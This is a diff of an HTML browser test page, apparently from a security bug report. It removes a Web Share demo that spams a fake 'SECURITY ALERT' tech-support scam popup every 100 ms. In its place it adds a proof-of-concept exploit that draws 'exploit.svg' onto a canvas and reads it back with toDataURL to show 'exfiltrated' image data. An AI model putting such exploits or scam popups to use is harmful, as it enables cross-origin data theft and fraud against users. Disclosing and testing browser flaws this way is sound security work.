@@ -1,14 +1,36 @@
-<!doctype html>
-<html>
-<head>
-<style>
-html { font-family: sans-serif; }
-</style>
-</head>
-<body>
-<h1>Web Share, popup</h1>
+
+This exploit can be performed completely without user interaction.
+
+The following buttons are just to help you in understanding the exploit and how it works:
+<p/>
+To run it press "exploit step 1" button followed by "exploit step 2"
+<input type="button" value="exploit step 1" onclick="go1()">
+<input type="button" value="exploit step 2" onclick="go2()">
+
+<object data="exploit.svg" type="image/svg+xml"></object>
+
+<canvas id="canvas" width="700" height="500"/>
+
+
 <script>
-setInterval(() => { navigator.share({title: '\u26A0 SECURITY ALERT \u26A0\nCall 800-555-5555 for Example.com Support', text: 'Call 800-555-5555'}); }, 100);
+  function importSVG(source, target) {
+  	var ctx = target.getContext("2d");
+  	var img = new Image();
+  	img.src = source;
+  	img.onload = function() {
+  		ctx.drawImage(img,0,0);
+  	}
+  }
+
+
+  function go1() {
+    var canvas = document.getElementById("canvas");
+    importSVG("exploit.svg", canvas);
+  }
+
+  function go2() {
+    var img = canvas.toDataURL("image/png");
+    document.write("Exploit triggered... Rendering exfiltrated image here: <p/><img border='1' src='"+img+"'/><hr/>To proof, just use this dataURL as image source:<p/><textarea rows='20' cols='80'>"+img+"</textarea>");
+  }  
+  
 </script>
-</body>
-</html>
